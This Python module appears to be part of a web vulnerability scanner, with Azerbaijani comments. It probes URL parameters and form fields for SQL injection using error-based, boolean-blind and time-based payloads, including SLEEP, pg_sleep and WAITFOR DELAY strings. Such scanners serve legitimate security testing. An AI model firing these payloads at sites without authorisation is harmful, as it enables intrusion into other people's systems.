"""
MODUL: SQL INJECTION — error + boolean + time-based (blind)
==========================================================
1) Error-based: ' göndərib SQL xəta mesajı axtarır (çox DBMS imzası).
2) Boolean-based (blind): AND 1=1 (doğru) vs AND 1=2 (yalan) cavablarını
   müqayisə edir — xəta görünməsə də fərqdən zəifliyi tapır.
3) Time-based (blind): MySQL/PostgreSQL/MSSQL/Oracle gecikmə payload-ları
   ilə cavab vaxtını ölçür.
Hər üçü zərərsizdir — data çıxarmır, heç nə silmir. Hər tapıntı TƏSDİQLƏNİR.
"""

import re
import time
import difflib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core import http_client

SQL_XETA = re.compile(
    r"SQL syntax.*MySQL|Warning.*mysqli?|MySQLSyntaxErrorException|"
    r"valid MySQL result|check the manual that corresponds to your MySQL|"
    r"PostgreSQL.*ERROR|pg_query\(\)|pg_exec\(\)|PSQLException|"
    r"ORA-\d{5}|Oracle error|Oracle.*Driver|quoted string not properly terminated|"
    r"Microsoft SQL Server|ODBC SQL Server Driver|SQLServer JDBC Driver|"
    r"System\.Data\.SqlClient\.SqlException|Unclosed quotation mark|"
    r"SQLite/JDBCDriver|sqlite3?.OperationalError|SQLITE_ERROR|"
    r"SQLSTATE\[|DB2 SQL error|CLI Driver.*DB2|Sybase message|"
    r"JDBC Driver|SQL error.*POS\d|you have an error in your sql syntax",
    re.IGNORECASE)

ERROR_PAYLOAD = ["'", '"', "')", "' --", "`", "''", "\")", "' OR '1'='1' -- ", "1'1"]

# Boolean cütləri: (DOĞRU, YALAN)
BOOL_CUT = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1-- -", " AND 1=2-- -"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("') AND ('1'='1", "') AND ('1'='2"),
]

GOZLEME = 5
TIME_PAYLOAD = [
    f"' AND SLEEP({GOZLEME})-- -",               # MySQL
    f'" AND SLEEP({GOZLEME})-- -',
    f"' OR SLEEP({GOZLEME})-- -",
    f" AND SLEEP({GOZLEME})-- -",
    f"'; WAITFOR DELAY '0:0:{GOZLEME}'-- -",      # MSSQL
    f"' AND pg_sleep({GOZLEME})-- -",             # PostgreSQL
    f"'||pg_sleep({GOZLEME})--",
    f"' AND 1=(SELECT 1 FROM PG_SLEEP({GOZLEME}))-- -",
    f"' RLIKE SLEEP({GOZLEME})-- -",              # MySQL (alt)
    f"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{GOZLEME})-- -",  # Oracle
]


def _xeta_var(metn):
    return bool(SQL_XETA.search(metn or ""))


def _ratio(a, b):
    return difflib.SequenceMatcher(None, a or "", b or "").quick_ratio()


def _vaxt(url, timeout, metod="GET", **kw):
    t0 = time.time()
    http_client.al(url, metod=metod, timeout=timeout, **kw)
    return time.time() - t0


def _boolean_test(baza_metn, get_url_cb):
    """get_url_cb(payload) -> cavab mətni. Doğru≈baza, yalan≠baza isə True."""
    for dogru, yalan in BOOL_CUT:
        tr = get_url_cb(dogru)
        fr = get_url_cb(yalan)
        if tr is None or fr is None:
            continue
        r_dogru = _ratio(baza_metn, tr)
        r_yalan = _ratio(baza_metn, fr)
        # DOĞRU baza ilə demək olar eyni, YALAN isə aydın fərqli olmalıdır
        if r_dogru >= 0.97 and r_yalan <= 0.92 and (r_dogru - r_yalan) >= 0.06:
            # TƏSDİQ: ikinci dəfə də eyni davranış
            tr2 = get_url_cb(dogru)
            fr2 = get_url_cb(yalan)
            if tr2 is None or fr2 is None:
                continue
            if _ratio(baza_metn, tr2) >= 0.97 and _ratio(baza_metn, fr2) <= 0.92:
                return True
    return False


def _get_yoxla(url, hesabat, timeout):
    parcalar = urlparse(url)
    parametrler = parse_qs(parcalar.query)

    normal = http_client.al(url, timeout=timeout)
    if normal and _xeta_var(normal.text):
        return  # sayt həmişə SQL xətası göstərir -> etibarsız
    baza_metn = normal.text if normal else ""

    for param in parametrler:
        def _url_ucun(payload):
            yeni = {k: v[0] for k, v in parametrler.items()}
            yeni[param] = yeni[param] + payload
            return urlunparse(parcalar._replace(query=urlencode(yeni)))

        # 1) Error-based
        tapildi = False
        for p in ERROR_PAYLOAD:
            cavab = http_client.al(_url_ucun(p), timeout=timeout)
            if cavab and _xeta_var(cavab.text):
                hesabat.elave_et("kritik", "sqli_url", _url_ucun(p), param=param)
                tapildi = True
                break
        if tapildi:
            continue

        # 2) Boolean-based
        def _get_metn(payload):
            c = http_client.al(_url_ucun(payload), timeout=timeout)
            return c.text if c else None
        if _boolean_test(baza_metn, _get_metn):
            hesabat.elave_et("kritik", "sqli_bool", _url_ucun(" AND 1=1"), param=param)
            continue

        # 3) Time-based
        baza = max(_vaxt(url, timeout), _vaxt(url, timeout))
        astana = baza + GOZLEME * 0.8
        for p in TIME_PAYLOAD:
            if _vaxt(_url_ucun(p), GOZLEME + timeout + 4) < astana:
                continue
            if _vaxt(_url_ucun(p), GOZLEME + timeout + 4) >= astana:
                hesabat.elave_et("kritik", "sqli_blind", _url_ucun(p), param=param)
                break


def _forma_yoxla(form, hesabat, timeout):
    metod = form["metod"]
    if not form["inputlar"]:
        return
    kw_normal = {"data": {i["ad"]: "test123" for i in form["inputlar"]}} if metod == "post" \
        else {"params": {i["ad"]: "test123" for i in form["inputlar"]}}
    normal = http_client.al(form["hereket"], metod=metod.upper(), timeout=timeout, **kw_normal)
    if normal and _xeta_var(normal.text):
        return
    for p in ERROR_PAYLOAD:
        data = {inp["ad"]: f"test{p}" for inp in form["inputlar"]}
        kw = {"data": data} if metod == "post" else {"params": data}
        cavab = http_client.al(form["hereket"], metod=metod.upper(), timeout=timeout, **kw)
        if cavab and _xeta_var(cavab.text):
            hesabat.elave_et("kritik", "sqli_forma", form["hereket"],
                             menbe=form["menbe_sehife"])
            return


def yoxla(parametrli_url, formalar, hesabat, timeout=8):
    for url in parametrli_url:
        _get_yoxla(url, hesabat, timeout)
    for form in formalar:
        _forma_yoxla(form, hesabat, timeout)
